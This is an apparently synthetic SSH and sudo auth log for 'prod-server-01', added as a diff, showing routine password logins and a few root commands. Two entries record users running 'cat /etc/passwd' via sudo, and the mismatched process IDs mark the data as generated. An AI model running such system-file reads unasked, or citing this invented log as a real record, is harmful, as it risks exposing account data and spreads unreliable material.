+May 20 06:06:50 prod-server-01 sshd[5867]: Accepted password for backup from 192.168.1.10 port 54922 ssh2
+May 20 06:06:52 prod-server-01 sshd[8920]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 06:10:27 prod-server-01 sshd[7141]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 06:12:21 prod-server-01 sshd[9471]: Accepted password for backup from 192.168.1.20 port 55646 ssh2
+May 20 06:12:23 prod-server-01 sshd[8869]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 06:18:53 prod-server-01 sshd[3886]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 06:20:16 prod-server-01 sshd[2588]: Accepted password for appuser from 10.0.0.5 port 54832 ssh2
+May 20 06:20:18 prod-server-01 sshd[1614]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 06:29:07 prod-server-01 sshd[9741]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 06:30:20 prod-server-01 sshd[4524]: Accepted password for backup from 192.168.1.20 port 52403 ssh2
+May 20 06:30:22 prod-server-01 sshd[8737]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 06:38:31 prod-server-01 sshd[5508]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 06:39:42 prod-server-01 sshd[3410]: Accepted password for deploy from 192.168.1.20 port 56293 ssh2
+May 20 06:39:44 prod-server-01 sshd[2256]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 06:49:24 prod-server-01 sshd[1094]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 06:49:56 prod-server-01 sshd[1274]: Accepted password for ubuntu from 10.0.0.5 port 52499 ssh2
+May 20 06:49:58 prod-server-01 sshd[5108]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 06:51:41 prod-server-01 sshd[9314]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 06:53:32 prod-server-01 sshd[4140]: Accepted password for monitor from 10.0.0.5 port 61615 ssh2
+May 20 06:53:34 prod-server-01 sshd[9900]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 07:00:52 prod-server-01 sshd[5182]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 07:02:37 prod-server-01 sshd[4857]: Accepted password for deploy from 192.168.1.10 port 57618 ssh2
+May 20 07:02:39 prod-server-01 sshd[1865]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 07:04:04 prod-server-01 sshd[7428]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 07:04:38 prod-server-01 sshd[5381]: Accepted password for deploy from 192.168.1.20 port 62851 ssh2
+May 20 07:04:40 prod-server-01 sshd[6259]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 07:11:37 prod-server-01 sshd[4454]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 07:12:22 prod-server-01 sshd[6653]: Accepted password for monitor from 10.0.0.5 port 63225 ssh2
+May 20 07:12:24 prod-server-01 sshd[4115]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 07:14:55 prod-server-01 sshd[4458]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 07:15:36 prod-server-01 sshd[6674]: Accepted password for ubuntu from 10.0.0.5 port 64160 ssh2
+May 20 07:15:38 prod-server-01 sshd[5316]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 07:16:08 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 20 07:22:43 prod-server-01 sshd[4792]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 07:24:41 prod-server-01 sshd[7194]: Accepted password for deploy from 10.0.0.5 port 53089 ssh2
+May 20 07:24:43 prod-server-01 sshd[3990]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 07:31:00 prod-server-01 sshd[1396]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 07:32:01 prod-server-01 sshd[3156]: Accepted password for deploy from 10.0.0.2 port 56476 ssh2
+May 20 07:32:03 prod-server-01 sshd[8863]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 07:36:16 prod-server-01 sshd[6155]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 07:38:03 prod-server-01 sshd[4855]: Accepted password for ubuntu from 192.168.1.20 port 53362 ssh2
+May 20 07:38:05 prod-server-01 sshd[7275]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 07:47:03 prod-server-01 sshd[2862]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 07:48:46 prod-server-01 sshd[8475]: Accepted password for deploy from 192.168.1.10 port 56503 ssh2
+May 20 07:48:48 prod-server-01 sshd[3924]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 07:49:18 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 20 07:58:25 prod-server-01 sshd[6107]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 08:00:02 prod-server-01 sshd[7908]: Accepted password for backup from 10.0.0.5 port 53556 ssh2
+May 20 08:00:04 prod-server-01 sshd[4294]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 08:04:43 prod-server-01 sshd[3949]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 08:06:10 prod-server-01 sshd[1513]: Accepted password for monitor from 192.168.1.10 port 60858 ssh2
+May 20 08:06:12 prod-server-01 sshd[5068]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 08:06:42 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 08:08:45 prod-server-01 sshd[3034]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 08:09:07 prod-server-01 sshd[1647]: Accepted password for backup from 10.0.0.5 port 52885 ssh2
+May 20 08:09:09 prod-server-01 sshd[9064]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 08:10:11 prod-server-01 sshd[1122]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 08:10:58 prod-server-01 sshd[5142]: Accepted password for deploy from 192.168.1.20 port 52375 ssh2
+May 20 08:11:00 prod-server-01 sshd[3723]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 08:15:14 prod-server-01 sshd[6937]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 08:16:29 prod-server-01 sshd[5441]: Accepted password for monitor from 10.0.0.5 port 53402 ssh2
+May 20 08:16:31 prod-server-01 sshd[1112]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 08:17:01 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/docker ps
+May 20 08:19:18 prod-server-01 sshd[9182]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 08:19:53 prod-server-01 sshd[5213]: Accepted password for backup from 192.168.1.10 port 61809 ssh2
+May 20 08:19:55 prod-server-01 sshd[1811]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 08:20:56 prod-server-01 sshd[7757]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 08:21:57 prod-server-01 sshd[7908]: Accepted password for deploy from 10.0.0.5 port 53961 ssh2
+May 20 08:21:59 prod-server-01 sshd[4183]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 08:26:27 prod-server-01 sshd[8973]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 08:28:17 prod-server-01 sshd[4320]: Accepted password for ubuntu from 10.0.0.2 port 57040 ssh2
+May 20 08:28:19 prod-server-01 sshd[6752]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 08:34:24 prod-server-01 sshd[7030]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 08:36:05 prod-server-01 sshd[1501]: Accepted password for monitor from 192.168.1.10 port 52433 ssh2
+May 20 08:36:07 prod-server-01 sshd[2892]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 08:44:29 prod-server-01 sshd[8008]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 08:45:27 prod-server-01 sshd[5636]: Accepted password for monitor from 192.168.1.10 port 50838 ssh2
+May 20 08:45:29 prod-server-01 sshd[7096]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 08:48:07 prod-server-01 sshd[3881]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 08:48:47 prod-server-01 sshd[8138]: Accepted password for appuser from 192.168.1.20 port 53195 ssh2
+May 20 08:48:49 prod-server-01 sshd[3116]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 08:58:30 prod-server-01 sshd[7326]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 08:58:40 prod-server-01 sshd[2920]: Accepted password for deploy from 10.0.0.2 port 58349 ssh2
+May 20 08:58:42 prod-server-01 sshd[1201]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 08:59:12 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 20 09:01:31 prod-server-01 sshd[6342]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 09:02:55 prod-server-01 sshd[3197]: Accepted password for monitor from 10.0.0.5 port 53026 ssh2
+May 20 09:02:57 prod-server-01 sshd[3354]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 09:03:27 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 09:08:16 prod-server-01 sshd[1182]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 09:09:24 prod-server-01 sshd[3097]: Accepted password for monitor from 10.0.0.5 port 60007 ssh2
+May 20 09:09:26 prod-server-01 sshd[4635]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 09:14:25 prod-server-01 sshd[9881]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 09:16:19 prod-server-01 sshd[1363]: Accepted password for backup from 192.168.1.20 port 61360 ssh2
+May 20 09:16:21 prod-server-01 sshd[5387]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 09:16:51 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/docker ps
+May 20 09:19:24 prod-server-01 sshd[5626]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 09:20:21 prod-server-01 sshd[4450]: Accepted password for appuser from 10.0.0.2 port 60680 ssh2
+May 20 09:20:23 prod-server-01 sshd[6474]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 09:23:46 prod-server-01 sshd[5161]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 09:25:04 prod-server-01 sshd[8195]: Accepted password for ubuntu from 192.168.1.10 port 62743 ssh2
+May 20 09:25:06 prod-server-01 sshd[4411]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 09:34:23 prod-server-01 sshd[6546]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
